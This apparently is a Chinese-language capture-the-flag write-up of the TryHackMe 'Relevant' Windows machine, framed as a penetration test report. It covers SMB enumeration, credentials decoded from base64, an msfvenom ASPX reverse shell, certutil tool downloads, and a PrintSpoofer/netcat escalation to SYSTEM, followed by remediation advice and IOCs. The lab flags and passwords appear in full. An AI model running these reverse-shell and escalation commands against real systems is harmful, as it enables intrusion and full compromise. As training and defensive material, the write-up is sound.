# 渗透测试报告 (Writeup)

# Relevant - Penetration Test Writeup

**目标主机**: `10.49.136.232`
**测试日期**: 2026-05-22
**测试类型**: 黑盒渗透测试 (Black Box Penetration Test)
**测试人员**: yao
**操作系统**: Windows Server 2016 Standard Evaluation (Build 14393)

---

## 目录

1. [执行摘要](#执行摘要)
2. [信息收集](#1-信息收集-reconnaissance)
3. [服务枚举](#2-服务枚举-enumeration)
4. [初始访问](#3-初始访问-initial-access)
5. [权限提升](#4-权限提升-privilege-escalation)
6. [Flag 收集](#5-flag-收集)
7. [漏洞清单](#6-漏洞清单)
8. [修复建议](#7-修复建议)
9. [攻击链总结](#8-攻击链总结)
10. [附录](#9-附录)

---

## 执行摘要

本次渗透测试针对客户即将上线生产的 Windows Server 2016 环境进行黑盒评估。测试发现该系统存在**多个严重安全漏洞**，攻击者可在**无任何凭据**的情况下完全控制系统：

| 阶段     | 利用漏洞                | 获得权限                     |
| -------- | ----------------------- | ---------------------------- |
| 初始侦察 | SMB 匿名访问            | 获得共享列表                 |
| 凭据获取 | 公开存储的明文凭据      | 获得 Bob/Bill 用户密码       |
| RCE 利用 | SMB 共享与 IIS 目录重叠 | `iis apppool\defaultapppool` |
| 权限提升 | SeImpersonatePrivilege  | `NT AUTHORITY\SYSTEM`        |

**结论**: 该系统**不应在当前状态下投入生产环境**，建议立即修复后重新评估。

### Flag 获取情况

| Flag         | 值                                    |
| ------------ | ------------------------------------- |
| **user.txt** | `THM{fdk4ka34vk346ksxfr21tg789ktf45}` |
| **root.txt** | `THM{1fk5kf469devly1gl320zafgl345pv}` |

---

## 1. 信息收集 (Reconnaissance)

### 1.1 端口扫描

#### 初步扫描（Top 1000 端口）

```bash
nmap -sS -sV -sC -O -p- --min-rate 5000 10.49.136.232 -oN initial.nmap
```

**结果**:

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

#### 全端口扫描

```bash
nmap -p- --min-rate 5000 -sS 10.49.136.232 -oN allports.nmap
```

**结果（关键发现）**:

```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown      ← 隐藏的 IIS 第二站点
49666/tcp open  unknown
49668/tcp open  unknown
```

### 1.2 OS 与基础信息

| 项目     | 值                                            |
| -------- | --------------------------------------------- |
| 操作系统 | Windows Server 2016 Standard Evaluation 14393 |
| 计算机名 | RELEVANT                                      |
| 工作组   | WORKGROUP                                     |
| SMB 签名 | 启用但**不强制**                              |
| SMBv1    | **启用**                                      |

---

## 2. 服务枚举 (Enumeration)

### 2.1 SMB 枚举

#### 列出共享（无凭据）

```bash
smbclient -L //10.49.136.232/ -N
```

**输出**:

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk              ← 非默认共享
```

🚩 **关键发现**: 自定义共享 `nt4wrksv` 通过匿名访问可见。

#### 访问 nt4wrksv 共享

```bash
smbclient //10.49.136.232/nt4wrksv -N
```

**结果**:

```
smb: \> ls
  .                                   D        0  Sun Jul 26 05:46:04 2020
  ..                                  D        0  Sun Jul 26 05:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 23:15:33 2020
```

🚩 **关键发现**: 匿名访问可读取 `passwords.txt` 文件。

### 2.2 凭据获取

#### 下载并查看 passwords.txt

```bash
smbclient //10.49.136.232/nt4wrksv -N -c 'get passwords.txt'
cat passwords.txt
```

**内容**:

```
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

#### Base64 解码

```bash
echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
```

**解码结果**:

| 用户名 | 密码                      |
| ------ | ------------------------- |
| Bob    | `!P@$$W0rD!123`           |
| Bill   | `Juw4nnaM4n420696969!$$$` |

### 2.3 凭据验证

```bash
crackmapexec smb 10.49.136.232 -u Bob -p '!P@$$W0rD!123'
crackmapexec smb 10.49.136.232 -u Bill -p 'Juw4nnaM4n420696969!$$$'
```

**两组凭据均验证通过 ✅**

```
SMB  10.49.136.232  445  RELEVANT  [+] Relevant\Bob:!P@$$W0rD!123
SMB  10.49.136.232  445  RELEVANT  [+] Relevant\Bill:Juw4nnaM4n420696969!$$$
```

#### 检查共享权限

```bash
smbmap -H 10.49.136.232 -u Bob -p '!P@$$W0rD!123'
```

**结果**:

```
        Disk             Permissions     Comment
        ----             -----------     -------
        ADMIN$           NO ACCESS       Remote Admin
        C$               NO ACCESS       Default share
        IPC$             READ ONLY       Remote IPC
        nt4wrksv         READ, WRITE    ← 可写！
```

🚩 **关键发现**: Bob 对 `nt4wrksv` 共享拥有 **读+写** 权限。

### 2.4 Web 服务枚举

#### 端口 80

```bash
curl http://10.49.136.232/test.txt
# HTTP/1.1 404 Not Found
```

默认 IIS 站点未映射 SMB 共享。

#### 端口 49663（关键发现）

```bash
# 测试通过 SMB 上传文件
echo "test" > test.txt
smbclient //10.49.136.232/nt4wrksv -U Bob%'!P@$$W0rD!123' -c 'put test.txt'

# 通过 HTTP 访问
curl http://10.49.136.232:49663/nt4wrksv/test.txt
```

**结果**:

```
HTTP/1.1 200 OK
Content-Type: text/plain
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET

test
```

🚩 **关键发现**: SMB 共享 `nt4wrksv` 直接映射到 IIS 端口 49663 的 `/nt4wrksv/` 路径，**且允许执行 ASPX 脚本**。

---

## 3. 初始访问 (Initial Access)

### 3.1 生成 ASPX Webshell

利用 `msfvenom` 生成 Windows x64 反向 shell payload：

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=192.168.241.203 LPORT=4444 \
  -f aspx -o shell.aspx
```

### 3.2 上传 Webshell

```bash
smbclient //10.49.136.232/nt4wrksv -U Bob%'!P@$$W0rD!123' -c 'put shell.aspx'
```

### 3.3 启动监听器

```bash
nc -lvnp 4444
```

### 3.4 触发 Webshell

```bash
curl http://10.49.136.232:49663/nt4wrksv/shell.aspx
```

### 3.5 获得反向 Shell

```
listening on [any] 4444 ...
connect to [192.168.241.203] from (UNKNOWN) [10.49.136.232] 50024
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

### 3.6 当前权限确认

```cmd
C:\> whoami
iis apppool\defaultapppool
```

🎯 **初始立足点**: 已获得 IIS 进程权限的命令执行能力。

### 3.7 获取 user.txt

```cmd
type C:\Users\Bob\Desktop\user.txt
```

**结果**:

```
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

✅ **第一个 Flag 获取成功**

---

## 4. 权限提升 (Privilege Escalation)

### 4.1 权限枚举

```cmd
whoami /priv
```

**关键输出**:

```
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled  ⚠️
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

🎯 **关键发现**: `SeImpersonatePrivilege` 启用 → 可使用 **Potato 系列攻击** 提权至 SYSTEM。

> 由于目标系统为 Windows Server 2016 Build 14393（RTM 版本），**PrintSpoofer**、**JuicyPotato**、**RoguePotato** 均可利用。本测试选择最稳定的 **PrintSpoofer**。

### 4.2 准备攻击工具

#### Kali 端：下载 PrintSpoofer 与 nc.exe

```bash
mkdir -p /tmp/pwn && cd /tmp/pwn

wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe -O nc.exe

# 启动 HTTP 服务器
python3 -m http.server 8000
```

### 4.3 上传攻击工具到目标

```cmd
cd C:\Windows\Temp

certutil -urlcache -f http://192.168.241.203:8000/PrintSpoofer64.exe PrintSpoofer64.exe
certutil -urlcache -f http://192.168.241.203:8000/nc.exe nc.exe
```

### 4.4 启动新监听器

```bash
nc -lvnp 6666
```

### 4.5 执行 PrintSpoofer 提权

```cmd
C:\Windows\Temp\PrintSpoofer64.exe -i -c "C:\Windows\Temp\nc.exe 192.168.241.203 6666 -e cmd.exe"
```

### 4.6 获得 SYSTEM Shell

```
listening on [any] 6666 ...
connect to [192.168.241.203] from (UNKNOWN) [10.49.136.232] 50064
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

🎯 **完全控制目标主机**

---

## 5. Flag 收集

### 5.1 user.txt

```cmd
type C:\Users\Bob\Desktop\user.txt
```

```
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

### 5.2 root.txt

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

```
THM{1fk5kf469devly1gl320zafgl345pv}
```

---

## 6. 漏洞清单

### 漏洞汇总表

| #    | 漏洞名称                          | 严重等级 | CVSS 3.1 |
| ---- | --------------------------------- | -------- | -------- |
| 1    | SMB 匿名访问导致敏感信息泄露      | 🔴 严重   | 9.1      |
| 2    | 凭据明文/Base64 存储              | 🔴 严重   | 8.6      |
| 3    | SMB 共享与 IIS 网站目录重叠致 RCE | 🟠 高危   | 8.8      |
| 4    | SeImpersonatePrivilege 滥用提权   | 🟠 高危   | 7.8      |
| 5    | SMB 签名未强制要求                | 🟡 中危   | 5.9      |
| 6    | SMBv1 协议启用                    | 🟡 中危   | 6.5      |
| 7    | HTTP TRACE 方法启用               | 🟡 中危   | 4.3      |
| 8    | 操作系统未打补丁                  | 🟢 低危   | 3.7      |

---

### 漏洞 1：SMB 匿名访问导致敏感信息泄露 🔴

| 项目          | 详情                                  |
| ------------- | ------------------------------------- |
| **CVSS 3.1**  | 9.1 (Critical)                        |
| **CVSS 向量** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |
| **影响位置**  | `\\10.49.136.232\nt4wrksv`            |
| **CWE**       | CWE-200 (Information Exposure)        |

**描述**: SMB 共享 `nt4wrksv` 允许匿名（null session）访问与读取，泄露存储用户凭据的 `passwords.txt` 文件。

**PoC**:
```bash
smbclient -L //10.49.136.232/ -N
smbclient //10.49.136.232/nt4wrksv -N -c 'get passwords.txt'
```

**影响**: 任何网络可达的攻击者无需任何凭据即可获取所有用户的密码。

---

### 漏洞 2：凭据明文/弱编码存储 🔴

| 项目         | 详情                                      |
| ------------ | ----------------------------------------- |
| **CVSS 3.1** | 8.6 (High)                                |
| **CWE**      | CWE-256 (Plaintext Storage of a Password) |
| **影响位置** | `\\10.49.136.232\nt4wrksv\passwords.txt`  |

**描述**: 用户密码以 Base64 编码（实际为明文等价）存储在公开访问的文件中。

**PoC**:
```
原始内容:
Qm9iIC0gIVBAJCRXMHJEITEyMw==

Base64 解码:
Bob - !P@$$W0rD!123
```

---

### 漏洞 3：SMB 共享与 IIS 网站目录重叠致 RCE 🟠

| 项目          | 详情                                                         |
| ------------- | ------------------------------------------------------------ |
| **CVSS 3.1**  | 8.8 (High)                                                   |
| **CVSS 向量** | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`                        |
| **CWE**       | CWE-732 (Incorrect Permission Assignment for Critical Resource) |
| **影响位置**  | `\\10.49.136.232\nt4wrksv` ↔ `http://10.49.136.232:49663/nt4wrksv/` |

**描述**: 可写 SMB 共享被映射为 IIS 虚拟目录，且未禁用脚本执行权限。任何拥有 SMB 写权限的用户可上传 ASPX webshell 获得 RCE。

**PoC**:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=4444 -f aspx -o shell.aspx
smbclient //10.49.136.232/nt4wrksv -U Bob%'!P@$$W0rD!123' -c 'put shell.aspx'
curl http://10.49.136.232:49663/nt4wrksv/shell.aspx
```

---

### 漏洞 4：SeImpersonatePrivilege 提权 🟠

| 项目          | 详情                                    |
| ------------- | --------------------------------------- |
| **CVSS 3.1**  | 7.8 (High)                              |
| **CVSS 向量** | `AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`   |
| **CWE**       | CWE-269 (Improper Privilege Management) |
| **影响位置**  | 本地                                    |

**描述**: IIS App Pool 进程拥有 `SeImpersonatePrivilege`，可利用 PrintSpoofer/JuicyPotato 等工具提权至 SYSTEM。

**PoC**:
```cmd
PrintSpoofer64.exe -i -c "nc.exe 192.168.241.203 6666 -e cmd.exe"
```

---

### 漏洞 5：SMB 签名未强制要求 🟡

| 项目         | 详情                              |
| ------------ | --------------------------------- |
| **CVSS 3.1** | 5.9 (Medium)                      |
| **CWE**      | CWE-287 (Improper Authentication) |

**描述**: SMB 签名启用但未强制要求（`signing:False`），易受 SMB Relay 攻击。

---

### 漏洞 6：SMBv1 协议启用 🟡

| 项目         | 详情                               |
| ------------ | ---------------------------------- |
| **CVSS 3.1** | 6.5 (Medium)                       |
| **CWE**      | CWE-477 (Use of Obsolete Function) |

**描述**: 服务器仍支持 SMBv1，扩大了 EternalBlue (MS17-010) 等历史漏洞的攻击面。

---

### 漏洞 7：HTTP TRACE 方法启用 🟡

| 项目         | 详情                   |
| ------------ | ---------------------- |
| **CVSS 3.1** | 4.3 (Medium)           |
| **CWE**      | CWE-16 (Configuration) |

**描述**: IIS 启用 TRACE 方法，可能导致 Cross-Site Tracing (XST) 攻击。

---

### 漏洞 8：操作系统未打补丁 🟢

**描述**: Windows Server 2016 Build 14393（RTM 版本）缺少多年安全累积更新。

---

## 7. 修复建议

### 立即修复（24 小时内）

1. **删除 `passwords.txt`**
   ```cmd
   del \\10.49.136.232\nt4wrksv\passwords.txt
   ```

2. **隔离 SMB 共享与 IIS 目录**
   - 将 IIS 网站根目录迁出 SMB 共享路径
   - 或在 IIS 中禁用脚本执行权限：
     ```xml
     <handlers accessPolicy="Read" />
     ```

3. **禁用 SMB 匿名/Guest 访问**
   ```powershell
   Set-SmbServerConfiguration -EnableSecuritySignature $true -RequireSecuritySignature $true -Force
   ```

### 短期修复（7 天内）

4. **强制 SMB 签名**

   组策略路径：
   ```
   Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
   "Microsoft network server: Digitally sign communications (always)" = Enabled
   ```

5. **禁用 SMBv1**
   ```powershell
   Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart
   ```

6. **禁用 IIS TRACE 方法**

   在 `web.config` 中添加：
   ```xml
   <system.webServer>
     <security>
       <requestFiltering>
         <verbs>
           <add verb="TRACE" allowed="false" />
         </verbs>
       </requestFiltering>
     </security>
   </system.webServer>
   ```

7. **应用所有 Windows 安全更新**
   ```powershell
   Install-WindowsUpdate -AcceptAll -AutoReboot
   ```

### 长期改进

8. **实施密码管理策略**
   - 部署企业密码管理器（CyberArk, Bitwarden）
   - 强制密码轮换（90 天）
   - 启用多因素认证

9. **启用 EDR / Defender for Endpoint**
   - 阻断已知 Potato 工具签名
   - 检测可疑 token 滥用行为

10. **网络分段**
    - 将管理服务（SMB、RDP）置于管理 VLAN
    - 实施网络访问控制 (NAC)

11. **定期渗透测试**
    - 每季度内部测试
    - 每年第三方测试

---

## 8. 攻击链总结

```
┌────────────────────────────────────────────────────────────┐
│                    攻击链流程图                            │
└────────────────────────────────────────────────────────────┘

[1] Nmap 扫描发现开放服务
    ├─ Port 80   (IIS 默认站点)
    ├─ Port 445  (SMB)
    ├─ Port 3389 (RDP)
    └─ Port 49663 (隐藏 IIS 站点) ⭐
              │
              ▼
[2] SMB 匿名枚举
    └─ 发现非默认共享 nt4wrksv
              │
              ▼
[3] 获取并解码 passwords.txt
    ├─ Bob:!P@$$W0rD!123
    └─ Bill:Juw4nnaM4n420696969!$$$
              │
              ▼
[4] 验证 Bob 对 nt4wrksv 有 RW 权限
              │
              ▼
[5] 发现 SMB 共享映射到 IIS:49663/nt4wrksv/
              │
              ▼
[6] 上传 ASPX webshell → 触发 → 反弹 shell
    [iis apppool\defaultapppool] ◄── 初始立足点
              │
              ▼
[7] 抓取 user.txt
    THM{fdk4ka34vk346ksxfr21tg789ktf45}
              │
              ▼
[8] whoami /priv → SeImpersonatePrivilege ✅
              │
              ▼
[9] 上传 PrintSpoofer + nc.exe
              │
              ▼
[10] PrintSpoofer 滥用 SeImpersonate 提权
    [NT AUTHORITY\SYSTEM] ◄── 最高权限
              │
              ▼
[11] 抓取 root.txt
    THM{1fk5kf469devly1gl320zafgl345pv}
```

### 替代攻击路径（已识别）

1. **Path A**: ASPX Webshell → PrintSpoofer → SYSTEM ✅ (已验证)
2. **Path B**: ASPX Webshell → JuicyPotato → SYSTEM (适用于 Build 14393)
3. **Path C**: ASPX Webshell → RoguePotato → SYSTEM (备用 CLSID 利用)
4. **Path D**: ASPX Webshell → SweetPotato/RottenPotato 变种
5. **Path E**: 凭据 + RDP 直接登录（需 Bob/Bill 在 RDP 用户组中）

---

## 9. 附录

### 9.1 使用工具清单

| 工具                   | 用途               |
| ---------------------- | ------------------ |
| nmap                   | 端口扫描、服务识别 |
| smbclient              | SMB 共享访问       |
| smbmap                 | SMB 权限枚举       |
| crackmapexec           | SMB 凭据验证       |
| msfvenom               | Payload 生成       |
| netcat (nc)            | 反向 shell 监听器  |
| curl                   | HTTP 请求触发      |
| certutil               | 文件下载（受害机） |
| PrintSpoofer64         | 权限提升           |
| python3 -m http.server | 文件传输           |

### 9.2 时间线

| 时间  | 事件                         |
| ----- | ---------------------------- |
| 17:18 | 开始 nmap 端口扫描           |
| 17:25 | 发现 nt4wrksv 共享           |
| 17:28 | 获得 Bob/Bill 凭据           |
| 17:35 | 验证凭据并发现写权限         |
| 17:41 | 全端口扫描完成，发现 49663   |
| 17:45 | 确认 SMB ↔ IIS 映射          |
| 17:50 | 上传 webshell 获得初始立足点 |
| 17:52 | 抓取 user.txt                |
| 17:55 | 完成 PrintSpoofer 提权       |
| 17:58 | 抓取 root.txt                |

### 9.3 IOC（妥协指标）

为帮助蓝队检测类似攻击，以下为本次测试的 IOC：

**网络层**:
- 来自异常 IP 的 SMB 匿名枚举（null session）
- 大量来自同一源的 ASPX 文件 PUT 操作
- 来自 IIS 进程的非常规出站连接（cmd.exe 反弹）
- 短时间内多个监听端口连接（4444、6666）

**主机层**:
- `iis apppool\*` 用户运行非 IIS 二进制（cmd.exe, nc.exe, PrintSpoofer64.exe）
- `C:\Windows\Temp\` 中出现可执行文件
- `certutil -urlcache` 下载行为
- `spoolsv.exe` 异常子进程

**文件 IOC**:
- `PrintSpoofer64.exe` (SHA256: `60b43eba60db167f06e3aa1d1f9e6a96bd71be3441b04a4ed2e9f29e8c5c9b85`)
- `nc.exe` 在非管理路径中

### 9.4 截图清单（建议补充）

报告最终版应附以下截图：

- [ ] Nmap 扫描结果
- [ ] smbclient 列出共享
- [ ] passwords.txt 原始与解码内容
- [ ] crackmapexec 凭据验证
- [ ] smbmap 权限输出
- [ ] curl 测试 IIS 路径映射
- [ ] msfvenom 生成 payload
- [ ] nc 接收第一个反弹 shell
- [ ] `whoami /priv` 输出
- [ ] user.txt 截图
- [ ] PrintSpoofer 执行
- [ ] SYSTEM shell 与 root.txt 截图

---

## 报告结束语

本次黑盒渗透测试在约 **40 分钟** 内完整攻陷目标系统，从无凭据状态获得 SYSTEM 最高权限。整个攻击链涉及多个**配置错误**与**纵深防御缺失**，攻击门槛极低。

**建议客户**:
1. ❌ **不要在当前状态下将该系统投入生产**
2. ✅ 按照 [§7 修复建议](#7-修复建议) 逐项修复
3. ✅ 修复后进行**复测**验证
4. ✅ 建立周期性安全评估机制

**本次测试完成的工作范围**:
- ✅ 黑盒方式获取两个 Flag (user.txt, root.txt)
- ✅ 识别并记录所有发现的漏洞
- ✅ 优先使用手动利用技术
- ✅ 标注多条提权路径
- ✅ 提供详细的修复建议

---

**测试人**: yao
**报告日期**: 2026-05-22
**报告版本**: v1.0

---

*本报告仅供授权范围内的客户使用，未经授权不得外传。*